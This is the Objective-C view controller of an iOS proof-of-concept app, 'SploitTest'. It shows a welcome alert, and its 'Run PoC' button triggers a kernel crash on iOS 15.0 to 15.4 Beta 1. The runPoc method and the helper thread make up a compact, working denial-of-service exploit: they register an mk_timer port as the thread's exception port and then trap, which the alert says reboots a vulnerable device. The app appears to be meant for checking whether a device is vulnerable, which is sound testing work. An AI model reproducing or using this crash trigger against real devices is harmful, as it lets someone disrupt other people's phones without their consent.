//
//  ViewController.m
//  SploitTest
//
//  Created by GeoSn0w on 3/18/22.
//

#import "ViewController.h"
#include <mach/mach.h>
#include <pthread.h>
#include <mach/mach_time.h>
#include <unistd.h>

extern mach_port_name_t mk_timer_create(void);

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];

}

- (void)viewDidAppear:(BOOL)animated {
    UIAlertController * alertvc = [UIAlertController alertControllerWithTitle: @ "Welcome!"
                                     message: @"Tap the Run PoC button. If the device vulnerable, it will reboot itself. If nothing happens, the device is likely not vulnerable. This vulnerability should work on iOS 15.0 to 15.4 Beta 1, but won't work on 15.4 release or newer betas." preferredStyle: UIAlertControllerStyleAlert
                                    ];
      UIAlertAction * action = [UIAlertAction actionWithTitle: @ "Dismiss"
                                style: UIAlertActionStyleDefault handler: ^ (UIAlertAction * _Nonnull action) {
                                  
                                }
                               ];
      [alertvc addAction: action];
      [self presentViewController: alertvc animated: true completion: nil];
}

- (IBAction)runPoc:(id)sender {
    int p = mk_timer_create();
    mach_port_insert_right(mach_task_self(),p,p,20); pthread_t t;
    pthread_create(&t,0,C,&p);
    for(;;);
}
void *C (void* a){
    thread_set_exception_ports(mach_thread_self(), EXC_MASK_ALL,*(int *)a,2,6);
    __builtin_trap();
    return a;
}

@end
